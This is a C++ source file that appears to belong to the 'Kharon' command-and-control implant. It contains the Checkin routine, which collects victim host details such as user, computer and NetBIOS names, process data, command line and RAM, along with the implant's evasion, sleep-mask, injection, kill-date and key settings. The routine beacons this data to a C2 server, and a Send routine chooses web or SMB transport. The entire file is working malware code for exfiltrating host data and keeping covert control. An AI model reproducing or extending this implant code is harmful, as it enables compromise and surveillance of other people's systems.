#include <Kharon.h>

auto DECLFN Transport::Checkin(
    VOID
) -> BOOL {
    PPACKAGE CheckinPkg = Self->Pkg->Checkin();
    PPARSER  CheckinPsr = (PPARSER)Self->Hp->Alloc( sizeof( PARSER ) );
    
    KhDbg( "start checkin routine" );

    PVOID  Data    = NULL;
    SIZE_T Length  = 0;
    PCHAR  NewUUID = NULL;
    PCHAR  OldUUID = NULL;
    ULONG  UUIDsz  = 36;

    //
    // the pattern checkin requirement
    //
    Self->Pkg->Pad( CheckinPkg, UC_PTR( Self->Session.AgentID ), 36 );
    Self->Pkg->Byte( CheckinPkg, Self->Machine.OsArch );
    Self->Pkg->Str( CheckinPkg, Self->Machine.UserName );
    Self->Pkg->Str( CheckinPkg, Self->Machine.CompName );
    Self->Pkg->Str( CheckinPkg, Self->Machine.NetBios );
    Self->Pkg->Int32( CheckinPkg, Self->Session.ProcessID );
    Self->Pkg->Str( CheckinPkg, Self->Session.ImagePath );

    //
    // custom agent storage for kharon config
    //

    // injection behavior
    Self->Pkg->Int32( CheckinPkg, Self->Inj.Alloc );
    Self->Pkg->Int32( CheckinPkg, Self->Inj.Write );

    // some evasion features enable informations
    Self->Pkg->Int32( CheckinPkg, Self->Sys->Enabled );
    Self->Pkg->Int32( CheckinPkg, Self->Spf->Enabled );
    Self->Pkg->Int32( CheckinPkg, Self->Cf->HookEnabled );
    Self->Pkg->Int32( CheckinPkg, KH_HARDWARE_BREAKPOINT_BYPASS_DOTNET );
    Self->Pkg->Int32( CheckinPkg, FALSE ); // patch exit

    // killdate informations
    Self->Pkg->Int32( CheckinPkg, Self->Session.KillDate.Enabled );
    Self->Pkg->Int32( CheckinPkg, Self->Session.KillDate.ExitProc );
    Self->Pkg->Int32( CheckinPkg, Self->Session.KillDate.SelfDelete );
    Self->Pkg->Int16( CheckinPkg, Self->Session.KillDate.Year );
    Self->Pkg->Int16( CheckinPkg, Self->Session.KillDate.Month );
    Self->Pkg->Int16( CheckinPkg, Self->Session.KillDate.Day );

    // additional session informations
    Self->Pkg->Str( CheckinPkg, Self->Session.CommandLine );
    Self->Pkg->Int32( CheckinPkg, Self->Session.HeapHandle );
    Self->Pkg->Int32( CheckinPkg, Self->Session.Elevated );
    Self->Pkg->Int32( CheckinPkg, Self->Session.Jitter );
    Self->Pkg->Int32( CheckinPkg, Self->Session.SleepTime );
    Self->Pkg->Int32( CheckinPkg, Self->Session.ParentID );
    Self->Pkg->Int32( CheckinPkg, Self->Session.ProcessArch );
    Self->Pkg->Int64( CheckinPkg, Self->Session.Base.Start );
    Self->Pkg->Int32( CheckinPkg, Self->Session.Base.Length );
    Self->Pkg->Int32( CheckinPkg, Self->Session.ThreadID );  
    
    // mask informations
    Self->Pkg->Int64( CheckinPkg, Self->Mk->Ctx.JmpGadget );  
    Self->Pkg->Int64( CheckinPkg, Self->Mk->Ctx.NtContinueGadget );  
    Self->Pkg->Int32( CheckinPkg, Self->Mk->Ctx.TechniqueID );  

    // process context informations
    Self->Pkg->Int32( CheckinPkg, Self->Ps->Ctx.ParentID );
    Self->Pkg->Int32( CheckinPkg, Self->Ps->Ctx.Pipe );
    if   ( !Self->Ps->Ctx.CurrentDir ) Self->Pkg->Str( CheckinPkg, "" );
    else Self->Pkg->Str( CheckinPkg, Self->Ps->Ctx.CurrentDir );
    Self->Pkg->Int32( CheckinPkg, Self->Ps->Ctx.BlockDlls );

    // additional machine informations
    Self->Pkg->Str( CheckinPkg, Self->Machine.ProcessorName );
    Self->Pkg->Int32( CheckinPkg, Self->Machine.TotalRAM );
    Self->Pkg->Int32( CheckinPkg, Self->Machine.AvalRAM );
    Self->Pkg->Int32( CheckinPkg, Self->Machine.UsedRAM );
    Self->Pkg->Int32( CheckinPkg, Self->Machine.PercentRAM );
    Self->Pkg->Int32( CheckinPkg, Self->Machine.ProcessorsNbr );

    // encryption key
    Self->Pkg->Bytes( CheckinPkg, Self->Crp->LokKey, sizeof( Self->Crp->LokKey ) );

    //
    // send the packet
    //
    while ( ! Self->Pkg->Transmit( CheckinPkg, &Data, &Length ) ) {
        Self->Mk->Main( Self->Session.SleepTime );
    }

    KhDbg( "transmited return %p [%d bytes]", Data, Length );

    //
    // parse response
    //
    Self->Psr->New( CheckinPsr, Data, Length );
    if ( !CheckinPsr->Original ) return FALSE;

    //
    // parse old uuid and new uuid
    //
    OldUUID = (PCHAR)Self->Psr->Pad( CheckinPsr, 36 );
    NewUUID = (PCHAR)Self->Psr->Pad( CheckinPsr, 36 );

    KhDbg( "old uuid: %s", OldUUID );
    KhDbg( "new uuid: %s", NewUUID );

    Self->Session.AgentID = A_PTR( Self->Hp->Alloc( UUIDsz ) );
    Mem::Copy( Self->Session.AgentID, NewUUID, UUIDsz );

    //
    // validate checkin response
    //
    if ( ( NewUUID && Str::CompareA( NewUUID, Self->Session.AgentID ) != 0 ) ) {
        Self->Session.Connected = TRUE;
    } else {

    }

    KhDbg( "set uuid: %s", Self->Session.AgentID );

    Self->Session.Connected = TRUE;

    KhDbg( "checkin routine done..." );

    return Self->Session.Connected;
}

auto Transport::Send(
    _In_      PVOID   Data,
    _In_      UINT64  Size,
    _Out_opt_ PVOID  *RecvData,
    _Out_opt_ UINT64 *RecvSize
) -> BOOL {
#if PROFILE_C2 == PROFILE_WEB
    return Self->Tsp->WebSend(
        Data, Size, RecvData, RecvSize
    );
#endif
#if PROFILE_C2 == PROFILE_SMB
    return Self->Tsp->SmbSend(
        Data, Size, RecvData, RecvSize
    );
#endif
}